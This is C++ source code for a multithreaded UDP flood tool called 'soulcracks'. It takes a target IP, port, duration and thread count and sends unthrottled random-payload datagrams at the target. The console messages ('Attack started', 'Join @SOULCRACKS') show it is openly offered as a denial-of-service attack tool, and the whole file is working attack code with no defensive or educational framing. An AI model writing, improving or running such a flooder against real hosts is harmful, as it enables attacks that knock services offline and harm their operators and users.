#include <iostream>
#include <cstdlib>
#include <cstring>
#include <arpa/inet.h>
#include <pthread.h>
#include <ctime>
#include <csignal>
#include <vector>
#include <memory>
#include <random>

#ifdef _WIN32
    #include <windows.h>
    void usleep(int duration) { Sleep(duration / 1000); }
#else
    #include <unistd.h>
#endif

#define BASE_PAYLOAD_SIZE 20  // Base random data size

// Shared RNG engine (thread-safe if each thread has its own instance)
// We'll seed it once per thread
void generate_payload(char* buffer, size_t size) {
    static thread_local std::random_device rd{};
    static thread_local std::mt19937 gen{rd()};  // One PRNG per thread
    static thread_local std::uniform_int_distribution<int> byte_dist{0, 255};

    for (size_t i = 0; i < size; ++i) {
        buffer[i] = static_cast<unsigned char>(byte_dist(gen));
    }
}

class Attack {
public:
    Attack(const std::string& ip, int port, int duration, int thread_id)
        : ip(ip), port(port), duration(duration), thread_id(thread_id) {}

    void attack_thread() {
        int sock;
        struct sockaddr_in server_addr;
        time_t endtime = time(nullptr) + duration;

        // Total payload: base data + thread_id (int) + timestamp (time_t)
        const size_t payload_size = BASE_PAYLOAD_SIZE + sizeof(int) + sizeof(time_t);
        char* payload = new char[payload_size];  // Dynamic to avoid stack overflow

        if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
            perror("Socket creation failed");
            delete[] payload;
            pthread_exit(nullptr);
        }

        memset(&server_addr, 0, sizeof(server_addr));
        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(static_cast<uint16_t>(port));
        server_addr.sin_addr.s_addr = inet_addr(ip.c_str());

        if (server_addr.sin_addr.s_addr == INADDR_NONE) {
            std::cerr << "Invalid IP address: " << ip << "\n";
            delete[] payload;
            close(sock);
            pthread_exit(nullptr);
        }

        while (time(nullptr) <= endtime) {
            // Generate random base payload
            generate_payload(payload, BASE_PAYLOAD_SIZE);

            // Append thread ID
            memcpy(payload + BASE_PAYLOAD_SIZE, &thread_id, sizeof(thread_id));

            // Append current timestamp
            time_t now = time(nullptr);
            memcpy(payload + BASE_PAYLOAD_SIZE + sizeof(thread_id), &now, sizeof(now));

            // Send full packet
            if (sendto(sock, payload, payload_size, 0,
                       reinterpret_cast<const struct sockaddr*>(&server_addr),
                       sizeof(server_addr)) < 0) {
                // Continue on failure (network issues, etc.)
                // perror("Send failed"); // Uncomment for debugging
            }

            // Optional: throttle per-thread packet rate
            // usleep(1000); // ~1000 pps per thread
        }

        delete[] payload;
        close(sock);
    }

private:
    std::string ip;
    int port;
    int duration;
    int thread_id;
};

void handle_sigint(int sig) {
    std::cout << "\nStopping attack...\n";
    exit(0);
}

void usage() {
    std::cout << "Usage: ./soulcracks ip port duration threads\n"
              << "Example: ./soulcracks 192.168.1.100 80 60 10\n";
    exit(1);
}

int main(int argc, char* argv[]) {
    if (argc != 5) {
        usage();
    }

    std::string ip = argv[1];
    int port = std::atoi(argv[2]);        // Fixed
    int duration = std::atoi(argv[3]);    // Fixed
    int threads = std::atoi(argv[4]);     // Fixed

    // Input validation
    if (port <= 0 || port > 65535) {
        std::cerr << "Error: Port must be between 1 and 65535.\n";
        return 1;
    }
    if (duration <= 0) {
        std::cerr << "Error: Duration must be greater than 0.\n";
        return 1;
    }
    if (threads <= 0 || threads > 1000) {
        std::cerr << "Error: Threads must be between 1 and 1000.\n";
        return 1;
    }

    std::signal(SIGINT, handle_sigint);

    std::vector<pthread_t> thread_ids(threads);
    std::vector<std::unique_ptr<Attack>> attacks;
    attacks.reserve(threads);

    std::cout << "Attack started on " << ip << ":" << port
              << " for " << duration << " seconds with " << threads << " threads\n";

    for (int i = 0; i < threads; ++i) {
        attacks.push_back(std::make_unique<Attack>(ip, port, duration, i));

        if (pthread_create(&thread_ids[i], nullptr,
                           [](void* arg) -> void* {
                               Attack* attack = static_cast<Attack*>(arg);
                               attack->attack_thread();
                               return nullptr;
                           }, attacks[i].get()) != 0) {
            perror("Failed to create thread");
            exit(1);
        }

        std::cout << "Launched thread with ID: " << thread_ids[i] << "\n";
    }

    // Wait for all threads
    for (int i = 0; i < threads; ++i) {
        pthread_join(thread_ids[i], nullptr);
    }

    std::cout << "Attack finished. Join @SOULCRACKS\n";
    return 0;
}